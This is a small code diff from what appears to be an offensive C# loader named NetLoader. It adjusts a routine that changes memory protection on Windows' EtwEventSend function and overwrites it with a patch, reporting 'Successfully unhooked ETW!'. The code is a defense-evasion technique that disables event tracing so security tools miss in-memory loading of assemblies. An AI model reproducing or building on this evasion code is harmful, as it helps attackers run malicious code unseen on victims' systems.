@@ -248,7 +248,7 @@ public class NetLoader
         var patch = getETWPayload();
         uint oldProtect;
 
-        if (fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect))
+        if (fVirtualProtect(pEtwEventSend - 0x10, (UIntPtr)patch.Length + 0x10, 0x40, out oldProtect))
         {
             Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
             Console.WriteLine("[+] Successfully unhooked ETW!");
